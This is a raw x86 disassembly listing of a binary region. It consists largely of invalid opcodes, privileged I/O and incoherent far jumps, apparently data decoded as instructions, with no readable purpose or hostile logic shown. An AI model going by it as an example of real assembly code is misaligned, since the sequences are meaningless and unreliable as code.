  41d9d2:	int    0x9b
  41d9d4:	cmc    
  41d9d5:	mov    ds:0x42a359c6,al
  41d9da:	push   esi
  41d9db:	jmp    0x8fcae9d1
  41d9e0:	adc    ebx,DWORD PTR [ecx+esi*4]
  41d9e3:	je     0x41da52
  41d9e5:	out    0x7f,eax
  41d9e7:	repnz mov al,ds:0xcac7ed09
  41d9ed:	mov    dh,0xd4
  41d9ef:	sahf   
  41d9f0:	adc    BYTE PTR fs:[ebx-0x1a51341a],0xc8
  41d9f8:	jp     0x41d97c
  41d9fa:	jns    0x41da32
  41d9fc:	div    esp
  41d9fe:	xor    al,0x41
  41da00:	mov    dh,0x36
  41da02:	or     eax,edx
  41da04:	pop    edi
  41da05:	push   ds
  41da06:	sbb    ch,BYTE PTR [ebp+0x60421dc2]
  41da0c:	out    dx,eax
  41da0d:	mov    eax,ds:0x5fe0c435
  41da12:	(bad)  
  41da14:	cdq    
  41da15:	sar    BYTE PTR [edx-0x2c8a470],1
  41da1b:	ins    DWORD PTR es:[edi],dx
  41da1c:	inc    eax
  41da1d:	push   es
  41da1e:	jns    0x41da47
  41da20:	fndisi(8087 only) 
  41da22:	fcom   DWORD PTR [ecx]
  41da24:	scas   eax,DWORD PTR es:[edi]
  41da25:	or     edx,esp
  41da27:	loopne 0x41d9b0
  41da29:	push   ecx
  41da2a:	pop    ecx
  41da2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da2c:	cmp    al,0x1
  41da2e:	fcmovne st,st(5)
  41da30:	mov    bh,0xc7
  41da32:	test   ah,0x7e
	...
  41da95:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41da9c:	cmp    al,0x5f
  41da9e:	out    dx,al
  41da9f:	lahf   
  41daa0:	push   esi
  41daa1:	pop    es
  41daa2:	pop    esi
  41daa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41daa4:	sub    ch,BYTE PTR [edx+0x139c5]
  41daaa:	pop    es
  41daab:	add    DWORD PTR [eax],eax
  41daad:	add    BYTE PTR [edx+0x28],ah
  41dab0:	fdiv   QWORD PTR [edi+0x6d33aef8]
  41dab6:	dec    eax
  41dab7:	inc    DWORD PTR [ecx+ecx*4+0x68afe761]
  41dabe:	and    DWORD PTR es:[ecx],0xe00da4e4
  41dac5:	pop    es
  41dac6:	xor    BYTE PTR [edi+0x3a],dh
  41dac9:	push   ebx
  41daca:	dec    edx
  41dacb:	scas   al,BYTE PTR es:[edi]
  41dacc:	inc    ebx
  41dacd:	ficom  WORD PTR [ecx]
  41dacf:	mov    ah,0x4a
  41dad1:	sti    
  41dad2:	je     0x41db29
  41dad4:	or     bh,cl
  41dad6:	faddp  st(3),st
  41dad8:	test   ch,dh
  41dada:	push   edx
  41dadb:	cmp    eax,0xe6a89dd1
  41dae0:	push   esp
  41dae1:	fcomp  DWORD PTR [ecx+0x17a890b6]
  41dae7:	xor    eax,0x58a60676
  41daec:	xlat   BYTE PTR ds:[ebx]
  41daed:	mov    al,ds:0x99ac3438
  41daf2:	jno    0x41daa2
  41daf4:	sub    DWORD PTR [eax-0x63d5bab2],ecx
  41dafa:	in     eax,dx
  41dafb:	fwait
  41dafc:	mov    dl,0xcf
  41dafe:	test   DWORD PTR [edx],ebx
  41db00:	push   ss
  41db01:	in     al,dx
  41db02:	pushf  
  41db03:	or     al,0xc3
  41db05:	adc    al,0x8e
  41db07:	push   ecx
  41db08:	pop    edi
  41db09:	or     edi,edx
  41db0b:	pop    ebx
  41db0c:	inc    esi
  41db0d:	loope  0x41da9f
  41db0f:	xchg   ebx,eax
  41db10:	push   0x2f8b0cd1
  41db15:	and    ebp,DWORD PTR [edx-0x430642db]
  41db1b:	mov    ch,0x6d
  41db1d:	pop    edi
  41db1e:	sbb    ax,0xce74
  41db22:	iret   
  41db23:	in     eax,0x2e
  41db25:	jg     0x41db9c
  41db27:	into   
  41db28:	mov    edx,0xaf55b0cc
  41db2d:	pop    esp
  41db2e:	(bad)  
  41db2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db30:	push   ebp
  41db31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db32:	(bad)  
  41db33:	inc    edx
  41db34:	push   es
  41db35:	stc    
  41db36:	mov    eax,ds:0xed51ec35
  41db3b:	mov    edx,0xdd5ab1ed
  41db40:	jne    0x41daf0
  41db42:	inc    edi
  41db43:	adc    DWORD PTR [edx-0x66],0xffffffef
  41db47:	xchg   esp,eax
  41db48:	jge    0x41db03
  41db4a:	sbb    eax,0x15e7b7ec
  41db4f:	mov    al,0x6e
  41db51:	sub    ebx,DWORD PTR [ebp-0x7e]
  41db54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db55:	les    eax,FWORD PTR [ebx-0x11]
  41db58:	mov    dh,0x35
  41db5a:	jae    0x41db44
  41db5c:	add    BYTE PTR [ecx+0x7eb01ffc],ah
  41db62:	xchg   edx,eax
  41db63:	xchg   edi,eax
  41db64:	mov    ecx,0x5667c190
  41db69:	sub    BYTE PTR [ecx],dh
  41db6b:	rcr    ebp,cl
  41db6d:	sahf   
  41db6e:	repnz repnz pushf 
  41db71:	and    eax,0x81af98d3
  41db76:	ss clc 
  41db78:	call   0xd21042a3
  41db7d:	(bad)  
  41db7e:	dec    eax
  41db7f:	pop    esp
  41db80:	inc    esi
  41db81:	hlt    
  41db82:	test   eax,0x6f27c75c
  41db87:	sbb    eax,0x42cf249a
  41db8c:	sahf   
  41db8d:	ds mov edi,0x163ed786
  41db93:	bound  eax,QWORD PTR [ecx]
  41db95:	retf   0x2a84
  41db98:	sub    ebp,DWORD PTR [ebp-0x33]
  41db9b:	inc    ebx
  41db9c:	ja     0x41dbae
  41db9e:	es jns 0x41dbef
  41dba1:	xchg   ecx,eax
  41dba2:	repnz sar BYTE PTR [ebp-0x2f],0x38
  41dba7:	inc    eax
  41dba8:	scas   eax,DWORD PTR es:[edi]
  41dba9:	pusha  
  41dbaa:	jmp    0xe096:0x4e4b9b3a
  41dbb1:	clc    
  41dbb2:	iret   
  41dbb3:	push   esp
  41dbb4:	daa    
	...
  41dc15:	add    BYTE PTR [edi-0x36],ch
  41dc18:	adc    eax,0xefdfb598
  41dc1d:	dec    ebp
  41dc1f:	ja     0x41dc8f
  41dc21:	aas    
  41dc22:	mov    dl,0x19
  41dc24:	mov    eax,0x13acc46
  41dc29:	add    BYTE PTR [edi],al
  41dc2b:	add    DWORD PTR [eax],eax
  41dc2d:	add    BYTE PTR [ebp-0x6dc5368c],dh
  41dc33:	icebp  
  41dc34:	push   edx
  41dc35:	repnz (bad) 
  41dc38:	adc    eax,0x6944a7e6
  41dc3d:	pop    esp
  41dc3e:	sub    esi,eax
  41dc40:	mov    esp,0x28c2a40
  41dc45:	adc    al,0x7e
  41dc47:	ret    
  41dc48:	in     eax,dx
  41dc49:	and    dh,BYTE PTR [edx]
  41dc4b:	dec    esi
  41dc4c:	jmp    0x41dcab
  41dc4e:	adc    eax,0x4344932b
  41dc53:	pop    eax
  41dc54:	iret   
  41dc55:	jmp    0x3b2effe8
  41dc5a:	mov    dh,0xc5
  41dc5c:	mov    ebx,0x4304d93d
  41dc61:	fsubr  QWORD PTR [ebx]
  41dc63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc64:	push   eax
  41dc65:	fdiv   DWORD PTR [eax+edx*4-0x180eb7cd]
  41dc6c:	in     eax,dx
  41dc6d:	scas   eax,DWORD PTR es:[edi]
  41dc6e:	or     dh,BYTE PTR [ebp-0x20]
  41dc71:	push   0x45
  41dc73:	call   0xfe4e:0x53ac85ea
  41dc7a:	and    edi,edi
  41dc7c:	xchg   ebx,eax
  41dc7d:	push   ecx
  41dc7e:	sar    BYTE PTR [esi+0xd],1
  41dc81:	(bad)  
  41dc82:	push   edi
  41dc84:	cmp    al,0xb6
  41dc86:	ret    
  41dc87:	mov    cl,0x8a
  41dc89:	push   ds
  41dc8a:	stc    
  41dc8b:	and    DWORD PTR [ecx],eax
  41dc8d:	fistp  QWORD PTR [ecx-0x38]
  41dc90:	add    cl,BYTE PTR es:[eax+0x3a8d2d42]
  41dc97:	mov    edi,0x8cf85d6c
  41dc9c:	loop   0x41dcef
  41dc9e:	rcl    BYTE PTR [ebp-0x4c],0x2d
  41dca2:	sbb    BYTE PTR [esi+0x3aaf3e01],bh
  41dca8:	inc    esi
  41dca9:	jge    0x41dd0b
  41dcab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcac:	(bad)  
  41dcad:	jmp    0x41dcb5
  41dcaf:	out    dx,al
  41dcb0:	and    BYTE PTR [ecx-0xbebb4f7],al
  41dcb6:	mov    BYTE PTR [ecx+ecx*4],al
  41dcb9:	sbb    eax,0xf84015db
  41dcbe:	out    0x8a,al
  41dcc0:	cmc    
  41dcc1:	rcr    esi,0x26
  41dcc4:	mov    BYTE PTR [edi-0x4f],0x51
  41dcc8:	inc    edx
  41dcc9:	ret    
  41dcca:	xor    DWORD PTR [edi+ebx*2+0x5e44340c],esi
  41dcd1:	xor    BYTE PTR [ebx-0x5ed1c5c4],ch
  41dcd7:	push   esi
  41dcd8:	sahf   
  41dcd9:	xor    DWORD PTR gs:[eax],ebx
  41dcdc:	rol    DWORD PTR [esi],cl
  41dcde:	sbb    al,0xa0
  41dce0:	push   eax
  41dce1:	inc    edx
  41dce2:	ret    0xec0d
  41dce5:	ret    
  41dce6:	out    dx,al
  41dce7:	jecxz  0x41dd4e
  41dce9:	dec    ebp
  41dcea:	xor    al,BYTE PTR [eax-0x7f]
  41dced:	xchg   ebx,eax
  41dcee:	add    esp,DWORD PTR [edx]
  41dcf0:	mov    eax,ds:0x88c99c95
  41dcf5:	add    eax,0x73f072a8
  41dcfa:	add    BYTE PTR [esi+0x3ca8b8ef],0xe4
  41dd01:	sar    DWORD PTR [ebx+0x70bddfa6],1
  41dd07:	dec    edi
  41dd08:	jmp    0x3a6:0x39dca213
  41dd0f:	xchg   ebx,eax
  41dd10:	adc    DWORD PTR [edx],esp
  41dd12:	iret   
  41dd13:	ficomp WORD PTR [esi-0x41]
  41dd16:	fs out 0x0,eax
  41dd19:	push   ds
  41dd1a:	or     eax,0x85f3ad48
  41dd1f:	xchg   ebx,eax
  41dd20:	inc    edi
  41dd21:	cmp    DWORD PTR [ebp+0x6b],edx
  41dd24:	cmp    al,0xe6
  41dd26:	mov    esi,0x7ace076a
  41dd2b:	inc    edi
  41dd2c:	mov    eax,ds:0xb015291f
  41dd31:	loope  0x41dcb4
  41dd33:	dec    eax
  41dd34:	lods   eax,DWORD PTR ds:[esi]
	...
  41dd95:	add    BYTE PTR [eax],ah
  41dd97:	repz das 
  41dd99:	cmp    bh,0xde
  41dd9c:	lods   eax,DWORD PTR ds:[esi]
  41dd9d:	repz mov ds:0xfe1667bb,eax
  41dda3:	inc    esi
  41dda4:	aad    0xf9
  41dda6:	sar    DWORD PTR [ebx],cl
  41dda8:	add    DWORD PTR [eax],eax
  41ddaa:	pop    es
  41ddab:	add    DWORD PTR [eax],eax
  41ddad:	add    ah,dh
  41ddaf:	push   cs
  41ddb0:	xchg   DWORD PTR ds:0x8baac407,ecx
  41ddb6:	lods   al,BYTE PTR ds:[esi]
  41ddb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddb8:	xor    eax,DWORD PTR [ecx+0x104f9909]
  41ddbe:	pop    ebp
  41ddbf:	rol    DWORD PTR [ebp+0x54],1
  41ddc2:	in     eax,0xc5
  41ddc4:	mov    bl,0xe0
  41ddc6:	xchg   edx,eax
  41ddc7:	lds    ecx,FWORD PTR [eax]
  41ddc9:	xchg   ebp,eax
  41ddca:	stos   DWORD PTR es:[edi],eax
  41ddcb:	std    
  41ddcc:	in     eax,0x68
  41ddce:	sub    BYTE PTR ds:0x1339f02a,0x2d
  41ddd5:	retf   
  41ddd6:	or     ebx,ecx
  41ddd8:	pop    eax
  41ddd9:	hlt    
  41ddda:	mov    WORD PTR [ebp-0x4268d072],ss
  41dde0:	jnp    0x41de35
  41dde2:	sub    al,0x98
  41dde4:	cli    
  41dde5:	mov    esi,DWORD PTR [edx+0x198503d9]
  41ddeb:	mov    bx,0x8afd
  41ddef:	repz cmp BYTE PTR [esi],0x69
  41ddf3:	js     0x41ddd6
  41ddf5:	mov    dh,0x27
  41ddf7:	aas    
  41ddf8:	mov    ebx,0x3ea02c90
  41ddfd:	dec    ecx
  41ddfe:	push   edi
  41ddff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de00:	push   ds
  41de01:	adc    edi,DWORD PTR [eax+ecx*1-0x27877ad3]
  41de08:	fwait
  41de09:	mov    ch,0x3c
  41de0b:	mov    edx,0x61d1d1c4
  41de10:	mov    ah,0xf6
  41de12:	mov    ds:0xf537ea4f,eax
  41de17:	cs pop ss
  41de19:	test   eax,0x3ae3d5e2
  41de1e:	in     al,0xe1
  41de20:	inc    eax
  41de21:	in     al,0x89
  41de23:	mov    ebx,0x9ba39bf9
  41de28:	fs mov dh,dl
  41de2b:	push   ds
  41de2c:	inc    esi
  41de2d:	cmp    eax,0x3c6b45b2
  41de32:	jno    0x41de1d
  41de34:	mov    al,0x6d
  41de36:	mov    edi,0x63c62564
  41de3b:	sti    
  41de3c:	mov    ds:0xa8fce3a0,eax
  41de41:	das    
  41de42:	lds    eax,FWORD PTR [eax+edi*2-0x6a]
  41de46:	mov    al,0xb1
  41de48:	mov    esi,0x1b227791
  41de4d:	lahf   
  41de4e:	or     eax,0xf9847c23
  41de53:	mov    bh,0x65
  41de55:	ds push 0xffffffcb
  41de58:	mov    ds:0x39cac4d2,eax
  41de5d:	stos   DWORD PTR es:[edi],eax
  41de5e:	xor    DWORD PTR [esi],esi
  41de60:	xor    al,0xf1
  41de62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de63:	push   ebx
  41de64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de65:	loopne 0x41ded4
  41de67:	mov    WORD PTR [eax-0x29],cs
  41de6a:	push   esp
  41de6b:	bound  ebx,QWORD PTR [edi-0x1]
  41de6e:	or     al,0x2e
  41de70:	xchg   edi,eax
  41de71:	jne    0x41ddfb
  41de73:	leave  
  41de74:	jbe    0x41de87
  41de76:	pop    eax
  41de77:	mov    ecx,0x394582b7
  41de7c:	dec    esi
  41de7d:	mov    esi,0x792ceb6c
  41de82:	loopne 0x41de2a
  41de84:	lods   eax,DWORD PTR ds:[esi]
  41de85:	aad    0xf4
  41de87:	stos   BYTE PTR es:[edi],al
  41de88:	not    BYTE PTR [ecx-0x5d]
  41de8b:	je     0x41de2a
  41de8d:	into   
  41de8e:	jo     0x41de36
  41de90:	fld    DWORD PTR [si+0x3]
  41de94:	outs   dx,BYTE PTR ds:[esi]
  41de95:	or     al,0xd1
  41de97:	push   ebp
  41de98:	(bad)  
  41de99:	pop    es
  41de9a:	ss fs inc esi
  41de9d:	xchg   DWORD PTR [edi-0x17],ecx
  41dea0:	inc    edx
  41dea1:	push   edi
  41dea2:	adc    edi,DWORD PTR [eax]
  41dea4:	aam    0x99
  41dea6:	(bad)  
  41dea7:	loop   0x41df14
  41dea9:	xchg   ecx,eax
  41deaa:	fyl2xp1 
  41deac:	int3   
  41dead:	aaa    
  41deae:	cmp    al,0xae
  41deb0:	jle    0x41dee1
  41deb2:	mov    al,0xa9
  41deb4:	pop    esi
	...
  41df15:	add    BYTE PTR [edi],bh
  41df17:	daa    
  41df18:	push   ss
  41df19:	cld    
  41df1a:	push   ds
  41df1b:	std    
  41df1c:	jmp    edi
  41df1e:	pop    es
  41df1f:	adc    eax,0xe798c191
  41df24:	mov    al,0xd8
  41df26:	fidivr DWORD PTR [ecx+eax*1]
  41df29:	add    BYTE PTR [edi],al
  41df2b:	add    DWORD PTR [eax],eax
  41df2d:	add    BYTE PTR [ecx+0x580d15ed],dh
  41df33:	enter  0xb6ca,0xd1
  41df37:	test   DWORD PTR [edi*1+0x54aa92b8],esp
  41df3e:	push   eax
  41df3f:	mov    ah,0x66
  41df41:	iret   
  41df42:	clc    
  41df43:	aam    0xcf
  41df45:	cmp    esp,esp
  41df47:	sbb    al,bl
  41df49:	mov    ecx,0xd0d0a8e9
  41df4e:	stos   DWORD PTR es:[edi],eax
  41df4f:	and    BYTE PTR [esp+esi*8],0x6d
  41df53:	cs (bad) 
  41df55:	cmp    dl,ah
  41df57:	adc    al,0x49
  41df59:	sbb    DWORD PTR [edx],esp
  41df5b:	mov    al,dl
  41df5d:	push   esp
  41df5e:	mov    dh,0x89
  41df60:	cmp    eax,0x5ee8c373
  41df65:	and    eax,0x6b309b8
  41df6a:	clc    
  41df6b:	inc    ebx
  41df6c:	dec    eax
  41df6d:	adc    eax,0xd1d1b9c9
  41df72:	fisub  DWORD PTR [edx-0x3e]
  41df75:	nop    DWORD PTR [edx+edi*1-0x7b]
  41df7a:	push   ds
  41df7b:	loop   0x41df7f
  41df7d:	and    ebp,DWORD PTR [ebp+0x691cabd6]
  41df83:	or     BYTE PTR [ebx+0x36241658],ah
  41df89:	cdq    
  41df8a:	int3   
  41df8b:	mov    al,0x40
  41df8d:	pop    ecx
  41df8e:	inc    eax
  41df8f:	adc    eax,0x947fc000
  41df94:	push   0x3fd11101
  41df99:	pop    esi
  41df9a:	sbb    eax,DWORD PTR [eax]
  41df9c:	jp     0x41df52
  41df9e:	js     0x41dfff
  41dfa0:	retf   0xc635
  41dfa3:	adc    eax,DWORD PTR [esi-0x32d210ae]
  41dfa9:	cli    
  41dfaa:	iret   
  41dfab:	pop    ds
  41dfac:	ror    DWORD PTR [esp+eiz*4],cl
  41dfaf:	jp     0x41dfdf
  41dfb1:	and    bh,BYTE PTR [eax+0x32]
  41dfb4:	das    
  41dfb5:	sbb    bh,cl
  41dfb7:	lea    ebx,cs:[edx-0x7dc8c83a]
  41dfbe:	sbb    BYTE PTR [edx-0x41501260],0x2c
  41dfc5:	addr16 in al,dx
  41dfc7:	ds gs cmc 
  41dfca:	pop    eax
  41dfcb:	int    0xce
  41dfcd:	mov    esi,0x1488418f
  41dfd2:	stc    
  41dfd3:	add    DWORD PTR [ebx+0x6],ebp
  41dfd6:	inc    esi
  41dfd7:	out    0x54,al
  41dfd9:	retf   0xcbf0
  41dfdc:	pop    ebp
  41dfdd:	dec    eax
  41dfde:	adc    eax,0x1d64b9e6
  41dfe3:	das    
  41dfe4:	sahf   
  41dfe5:	jmp    0xdd8f:0xca289dca
  41dfec:	enter  0x48fe,0xa0
  41dff0:	dec    edi
  41dff1:	add    al,0xa8
  41dff3:	nop
  41dff4:	out    dx,eax
  41dff5:	mov    BYTE PTR [eax-0x428e1e0d],ah
  41dffb:	push   esp
  41dffc:	cmp    bl,cl
  41dffe:	lds    ecx,FWORD PTR [ebx-0xfa59ab0]
  41e004:	(bad)  
  41e005:	add    eax,0x3c248599
  41e00a:	mov    ah,BYTE PTR [edx+0x6f069b24]
  41e010:	pushf  
  41e011:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e012:	cli    
  41e013:	aad    0x8f
  41e015:	add    BYTE PTR [edx-0x3e],cl
  41e018:	bound  esp,QWORD PTR [ecx+ebx*2+0x5350ffed]
  41e01f:	inc    eax
  41e020:	out    0x6a,al
  41e022:	or     al,0x67
  41e024:	cmp    bh,BYTE PTR [ebp+0x240631bb]
  41e02a:	and    BYTE PTR [eax+0x50],dl
  41e02d:	leave  
  41e02e:	fimul  WORD PTR [edi]
  41e030:	sub    BYTE PTR [edi+ecx*1],al
  41e033:	lock add BYTE PTR [eax],0x0
	...
  41e093:	add    BYTE PTR [eax],al
  41e095:	add    BYTE PTR [edi+0x53],cl
  41e098:	add    al,0xc
  41e09a:	sbb    al,0x5f
  41e09c:	dec    edi
  41e09d:	push   ebx
  41e09e:	out    0x48,eax
  41e0a0:	jge    0x41e0ce
  41e0a2:	lods   al,BYTE PTR ds:[esi]
  41e0a3:	dec    esp
  41e0a4:	pop    es
  41e0a5:	dec    ecx
  41e0a6:	loope  0x41e0e5
  41e0a8:	add    DWORD PTR [eax],eax
  41e0aa:	pop    es
  41e0ab:	add    DWORD PTR [eax],eax
  41e0ad:	add    dl,bh
  41e0af:	ret    0xde06
  41e0b2:	aaa    
  41e0b3:	and    DWORD PTR [edi+ecx*2],ecx
  41e0b6:	pop    ss
  41e0b7:	cmp    al,0xa0
  41e0b9:	adc    eax,0xa98f8b46
  41e0be:	pop    es
  41e0bf:	jno    0x41e05e
  41e0c1:	cld    
  41e0c2:	call   0x1b6fcef
  41e0c7:	mov    dh,cl
  41e0c9:	push   cs
  41e0ca:	and    ecx,DWORD PTR [ecx]
  41e0cc:	jl     0x41e0ed
  41e0ce:	fsubr  st(3),st
  41e0d0:	fsub   QWORD PTR [ebx]
  41e0d2:	pushf  
  41e0d3:	frstor [ebx+ebx*2-0xe6132b0]
  41e0da:	mov    bh,0x6a
  41e0dc:	sub    ah,ah
  41e0de:	add    cl,ah
  41e0e0:	mov    al,ds:0xb40dc73c
  41e0e5:	inc    edi
  41e0e6:	into   
  41e0e7:	das    
  41e0e8:	add    DWORD PTR [ebx-0x2c],edx
  41e0eb:	rcl    BYTE PTR [eax],cl
  41e0ed:	clc    
  41e0ee:	mov    esp,edx
  41e0f0:	fbld   TBYTE PTR [ebp-0x1e9432d7]
  41e0f6:	mov    dh,0x86
  41e0f8:	mov    eax,0x53b1ce2d
  41e0fd:	jmp    0x6e911026
  41e102:	sub    bp,WORD PTR [ebx]
  41e105:	xor    dh,dl
  41e107:	hlt    
  41e108:	aam    0x6b
  41e10a:	jbe    0x41e105
  41e10c:	(bad)  
  41e10d:	sbb    DWORD PTR [ebx],ebp
  41e10f:	imul   esi,esp,0x997e5fdd
  41e115:	fstp   QWORD PTR [eax+edi*8]
  41e118:	add    eax,0xb9fa7aec
  41e11d:	and    BYTE PTR [esi-0x2fc688e3],bl
  41e123:	xchg   BYTE PTR [esi+0x71d0a040],bl
  41e129:	scas   eax,DWORD PTR es:[edi]
  41e12a:	sbb    al,0xc8
  41e12c:	ret    0xb8ee
  41e12f:	pop    ds
  41e130:	mov    ebp,0xfc2bceff
  41e135:	rcr    BYTE PTR [edi-0x52],cl
  41e138:	dec    edi
  41e139:	ja     0x41e0e8
  41e13b:	xchg   ebx,eax
  41e13c:	leave  
  41e13d:	pop    ebp
  41e13e:	xchg   ebx,eax
  41e13f:	xchg   ebp,eax
  41e140:	outs   dx,BYTE PTR ds:[esi]
  41e141:	xor    ah,bh
  41e143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e144:	imul   ecx,edi,0x2a1b5da6
  41e14a:	jle    0x41e11b
  41e14c:	sub    al,0xdc
  41e14e:	mov    dh,0x59
  41e150:	jmp    0x464e:0x4ac13640
  41e157:	bound  ebp,QWORD PTR [eax+0x34d313b2]
  41e15d:	sbb    eax,0x63423ad2
  41e162:	mov    al,0x2f
  41e164:	je     0x41e1d5
  41e166:	xchg   DWORD PTR [eax-0x6f],esp
  41e169:	in     al,0x69
  41e16b:	or     BYTE PTR [edi-0x32],ch
  41e16e:	xchg   ebp,eax
  41e16f:	fsubp  st(7),st
  41e171:	dec    ecx
  41e172:	cmp    eax,0xd3b41a4d
  41e177:	inc    esp
  41e178:	add    BYTE PTR [ebx],bh
  41e17a:	sub    DWORD PTR es:[ebx+0x2652e74e],0xe63d2bbd
  41e185:	ins    BYTE PTR es:[edi],dx
  41e186:	sbb    DWORD PTR [edx+0x5dea7c0b],edx
  41e18c:	mov    ecx,0xfc816c2b
  41e191:	ret    
  41e192:	push   0x14
  41e194:	out    dx,al
  41e195:	sub    dh,cl
  41e197:	repz enter 0x8348,0x0
  41e19c:	les    esp,FWORD PTR [ebx-0x43010a67]
  41e1a2:	or     eax,0x9e5d5478
  41e1a7:	mov    dh,0x56
  41e1a9:	test   al,0xb0
  41e1ab:	jne    0x41e161
  41e1ad:	cmp    edi,edx
  41e1af:	lods   eax,DWORD PTR ds:[esi]
  41e1b0:	out    0x53,al
  41e1b2:	shl    BYTE PTR [ebx-0x2a],1
	...
  41e215:	add    BYTE PTR [ebx-0x1988fe],ch
  41e21b:	idiv   DWORD PTR [ebx-0xf75b5b1]
  41e221:	mov    edx,edx
  41e223:	jge    0x41e25a
  41e225:	test   eax,0x13ee8
  41e22a:	pop    es
  41e22b:	add    DWORD PTR [eax],eax
  41e22d:	add    BYTE PTR [edi-0x48],ah
  41e230:	loop   0x41e25f
  41e232:	ror    DWORD PTR [eax+0x6058a6b],0x5e
  41e239:	lea    edx,[edi-0x65]
  41e23c:	jle    0x41e22c
  41e23e:	jnp    0x41e1fc
  41e240:	mov    cl,BYTE PTR [esi-0x3f629aa6]
  41e246:	pop    edx
  41e247:	int    0x55
  41e249:	loopne 0x41e241
  41e24b:	cmp    eax,0x7a861
  41e250:	pop    edx
  41e251:	sbb    DWORD PTR [eax],0x2b
  41e254:	mov    ds:0x2464f9fd,eax
  41e259:	ret    0xc912
  41e25c:	lea    esp,[esi+0x78]
  41e25f:	push   esp
  41e260:	fadd   st,st(3)
  41e262:	retf   0x8e8e
  41e265:	adc    DWORD PTR [edi],ebp
  41e267:	retf   0xc333
  41e26a:	jb     0x41e2b5
  41e26c:	adc    DWORD PTR [esp+ebx*2],0xffffffa6
  41e270:	or     esi,esp
  41e272:	jnp    0x41e2df
  41e274:	mov    esp,edx
  41e276:	dec    ebx
  41e277:	cmp    BYTE PTR [ebx+0xd6cd43d],ch
  41e27d:	sub    ecx,DWORD PTR [ebx-0xf7c6f2]
  41e283:	hlt    
  41e284:	add    BYTE PTR [ebx-0x10],0x55
  41e288:	ret    
  41e289:	pusha  
  41e28a:	sti    
  41e28b:	icebp  
  41e28c:	fs pop edx
  41e28e:	pop    ss
  41e28f:	jecxz  0x41e292
  41e291:	pushf  
  41e292:	ret    0x725d
  41e295:	dec    ebp
  41e296:	dec    edx
  41e297:	neg    BYTE PTR [eax-0x44]
  41e29a:	xchg   edx,eax
  41e29b:	in     eax,dx
  41e29c:	fstp   QWORD PTR [eax+0x25]
  41e29f:	ss (bad) 
  41e2a1:	mov    ecx,0xece3922b
  41e2a6:	popf   
  41e2a7:	out    0xc8,al
  41e2a9:	push   esi
  41e2aa:	dec    edx
  41e2ab:	outs   dx,BYTE PTR ds:[esi]
  41e2ac:	or     al,0x48
  41e2ae:	repnz leave 
  41e2b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2b1:	inc    edi
  41e2b2:	xchg   BYTE PTR [edx-0x5d770da8],ah
  41e2b8:	pop    ebx
  41e2b9:	int3   
  41e2ba:	lock xor BYTE PTR [esi],bh
  41e2bd:	popf   
  41e2be:	jo     0x41e2d3
  41e2c0:	call   0x3f82d1d3
  41e2c5:	cdq    
  41e2c6:	clc    
  41e2c7:	fsubp  st(3),st
  41e2c9:	cdq    
  41e2ca:	push   ds
  41e2cb:	fcomp  st(6)
  41e2cd:	stos   BYTE PTR es:[edi],al
  41e2ce:	repnz aaa 
  41e2d0:	mov    bh,0x67
  41e2d2:	call   0x1d5f:0xc16e2f45
  41e2d9:	xchg   ebx,eax
  41e2da:	mov    ecx,0xa682f45c
  41e2df:	inc    esp
  41e2e0:	xor    al,BYTE PTR [ecx+0x24ca980]
  41e2e6:	adc    ah,bh
  41e2e8:	(bad)  
  41e2e9:	jmp    0x41e333
  41e2eb:	xor    al,BYTE PTR cs:[esi-0x4c7fcabe]
  41e2f2:	cmc    
  41e2f3:	lea    ecx,[esp+esi*8]
  41e2f6:	(bad)  
  41e2f7:	push   edi
  41e2f8:	sub    al,0x30
  41e2fa:	pop    eax
  41e2fb:	xor    ebx,DWORD PTR [ebx+0x55]
  41e2fe:	data16 mov al,0x66
  41e301:	cs sbb eax,0xf1acf6e2
  41e307:	cmp    BYTE PTR [edi],cl
  41e309:	repz mov dl,0xd9
  41e30c:	cmp    eax,0xe3b3aaa2
  41e311:	adc    eax,0x2b71c51c
  41e316:	pop    ecx
  41e317:	retf   
  41e318:	arpl   WORD PTR [ecx-0x55409bd9],bx
  41e31e:	mov    dl,0xad
  41e320:	pop    ds
  41e321:	dec    esi
  41e322:	sub    edx,edi
  41e324:	(bad)  
  41e325:	call   FWORD PTR [ebx-0x4f]
  41e328:	das    
  41e329:	arpl   WORD PTR [esi+ecx*8],sp
  41e32c:	cmp    BYTE PTR fs:[ecx+edi*2],dh
  41e330:	(bad)  
  41e331:	iret   
  41e332:	daa    
  41e333:	popf   
  41e334:	pop    eax
	...
  41e395:	add    BYTE PTR [ecx-0xe088ee],cl
  41e39b:	jg     0x41e386
  41e39d:	xchg   esi,eax
  41e39e:	cmp    eax,0xdb204855
  41e3a3:	cwde   
  41e3a4:	mov    ds:0x13fefa0,eax
  41e3a9:	add    BYTE PTR [edi],al
  41e3ab:	add    DWORD PTR [eax],eax
  41e3ad:	add    BYTE PTR [eax],bl
  41e3af:	lods   eax,DWORD PTR ds:[esi]
  41e3b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3b1:	or     BYTE PTR [esi],dl
  41e3b3:	and    ecx,DWORD PTR [ecx-0x33]
  41e3b6:	or     eax,0x3e6993f7
  41e3bb:	dec    cl
  41e3bd:	xor    al,0x74
  41e3bf:	mov    ch,0x5a
  41e3c1:	adc    edx,DWORD PTR [ebp+0x18]
  41e3c4:	pop    esi
  41e3c5:	outs   dx,BYTE PTR ds:[esi]
  41e3c6:	jns    0x41e3c3
  41e3c8:	dec    edi
  41e3c9:	xchg   BYTE PTR ds:0xf07e63f3,bl
  41e3cf:	xor    al,0x41
  41e3d1:	pop    edi
  41e3d2:	adc    ebp,DWORD PTR [ebx-0x12]
  41e3d5:	jp     0x41e434
